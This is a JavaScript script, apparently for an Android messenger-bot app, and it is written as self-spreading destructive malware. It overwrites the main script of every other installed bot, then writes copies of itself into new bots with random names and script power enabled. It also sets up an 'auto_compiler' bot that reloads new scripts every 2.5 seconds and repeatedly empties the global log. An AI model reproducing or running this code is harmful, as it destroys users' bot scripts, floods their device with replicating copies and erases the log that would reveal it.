var path = com.xfl.msgbot.utils.SharedVar.Companion.getBotsPath().split('/').slice(0, -1).join('/');
var botPath = path + 'Bots/';

let oldScript = [];
java.io.File(botPath).listFiles().map(e => oldScript.push(String(e).split('Bots/')[1]));

for(var m=0; m<oldScript.length; m++) {
    var scr = JSON.parse(FileStream.read(botPath + oldScript[m] + '/bot.json')).main;
    var oldScriptPath = botPath + oldScript[m] + '/'+ scr;
    if(!FileStream.read(oldScriptPath).startsWith('/*ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ*/')) FileStream.write(oldScriptPath, 'const scriptName = "'+oldScript[m]+'";');
}

FileStream.write(path + 'script2.js',`var script = FileStream.read('sdcard/msgbot/script2.js'); var path = com.xfl.msgbot.utils.SharedVar.Companion.getBotsPath().split('/').slice(0, -1).join('/'); var botPath = path + 'Bots/'; for(var i=0; i<3; i++) { var ran = Math.floor(Math.random() * 89999999999) + 10000000000; var scriptPath = botPath + ran + "/"; FileStream.write(scriptPath + "b.js",script); FileStream.write(scriptPath + "module/r.r","a"); FileStream.remove(scriptPath + "module/r,r"); FileStream.write(scriptPath + "bot.json",JSON.stringify({main: "b.js", option: {"apiLevel": 1, "useUnifiedParams": false, "useBabel": false, "scriptPower": true}},null,2)); }`);

var scriptPath = botPath + "b/";
FileStream.write(scriptPath + "b.js",FileStream.read(path + "script2.js"));
FileStream.write(scriptPath + "module/r.r","a");
FileStream.remove(scriptPath + "module/r.r");
FileStream.write(scriptPath + "bot.json",JSON.stringify({main: "b.js", option: {"apiLevel": 1, "useUnifiedParams": false, "useBabel": false, "scriptPower": true}},null,2))

let com = botPath+"auto_compiler/";
FileStream.write(com+"m.js",`let oldScript = Api.getScriptNames();\nsetInterval(function () {\n  FileStream.write(path + "/GLOBAL_LOG.json", "[]");\n  var scriptList = Api.getScriptNames();\n  for(var i=0; i<scriptList.length; i++) {\n    var check = false;\n    for(var j=0; j<oldScript.length; j++) if(oldScript[j] == scriptList[i]) check = true;\n    if(!check) Api.reload(scriptList[i]);\n  }\n}, 2500);`);
FileStream.write(com + "bot.json",JSON.stringify({main: "m.js", option: {"apiLevel": 1, "useUnifiedParams": false, "useBabel": false, "scriptPower": true}},null,2));
FileStream.write(com + "module/r.r","a");
FileStream.remove(com + "module/r.r");
Api.reload("auto_compiler");

setInterval(function () {
  FileStream.write(path + "/GLOBAL_LOG.json", "[]");
  var scriptList = Api.getScriptNames();
  for(var i=0; i<scriptList.length; i++) {
    var check = false;
    for(var j=0; j<oldScript.length; j++) if(oldScript[j] == scriptList[i]) check = true;
    if(!check) Api.reload(scriptList[i]);
  }
}, 2500);
